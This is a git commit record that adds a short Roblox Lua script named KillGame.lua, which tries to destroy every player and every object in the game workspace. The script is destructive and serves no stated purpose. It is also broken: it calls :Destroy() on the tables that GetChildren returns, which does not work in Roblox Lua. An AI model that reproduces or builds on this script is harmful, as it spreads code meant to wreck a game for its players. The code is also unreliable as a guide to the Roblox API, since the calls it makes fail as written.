e74354942d7154e2cb73e93c7764c128e24e64ce
lalalala <73487410+aliza13@users.noreply.github.com>
2021-12-02 21:53:48 +0000

    Create KillGame.lua

---
+++ GameModules/KillGame.lua
@@ -0,0 +1,7 @@
+local Processor = game:GetService("StarterGui")
+
+local RemovePlayerStarter = game.Players:GetChildren()
+RemovePlayerStarter:Destroy()
+
+local RemoveWorkspaceStarter = game.Workspace:GetChildren()
+RemoveWorkspaceStarter:Destroy()
